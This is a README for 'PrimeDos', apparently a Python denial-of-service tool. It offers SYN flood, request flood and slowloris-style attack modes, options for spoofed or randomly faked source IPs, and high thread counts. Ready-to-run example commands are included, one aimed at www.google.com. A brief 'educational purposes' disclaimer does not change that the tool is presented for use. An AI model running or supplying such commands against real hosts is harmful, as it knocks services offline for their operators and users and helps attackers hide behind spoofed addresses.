# PrimeDos

* This is my new update 
* This script have 3 type of ddos attacks : SYNFLOOD | REQUEST | Pyslow
* Script has pyslow attack type which is similar to slowloris attack

# Note
* I wrote this script for educational not for destructive purposes and illegal actions, so I won't be responsible for that  


# Requires module
* termcolor
* colorama



# Usage

'  ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓██████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░6░▒▓██████▓▒░6░▒▓███████▓▒░6
'  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░66666666
'  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░66666666
'  ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░6░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░66
'  ░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░666666░▒▓█▓▒░6
'  ░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░666666░▒▓█▓▒░6
'  ░▒▓█▓▒░666666░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░6░▒▓██████▓▒░░▒▓███████▓▒░66
'  6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
'  6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666

                                                                    
 PrimeDos | Script used for testing ddos | The Anon 69     
 Author: ___minuhereee___                                                
 Github: http://github.com/minuhereee                              
        Version:3.0 

    usage: python3 PrimeDos.py -d [target] -p [port] -T [number threads]

    optional arguments:
    -h, --help       show this help message and exit
    -v, --version    show program's version number and exit

    options:

    -d <ip|domain>   Specify your target such an ip or domain name
    -t <float>       Set timeout for socket
    -T <int>         Set threads number for connection (default = 1000)
    -p <int>         Specify port target (default = 80) |Only required with pyslow attack|
    -s <int>         Set sleep time for reconnection
    -i <ip address>  Specify spoofed ip unless use fake ip
    -Request         Enable request target
    -Synflood        Enable synflood attack
    -Pyslow          Enable pyslow attack
    --fakeip         Option to create fake ip if not specify spoofed ip

    Example:
        python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
        python3 pyddos.py -d www.domain.com -s 100 -Request
        python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0

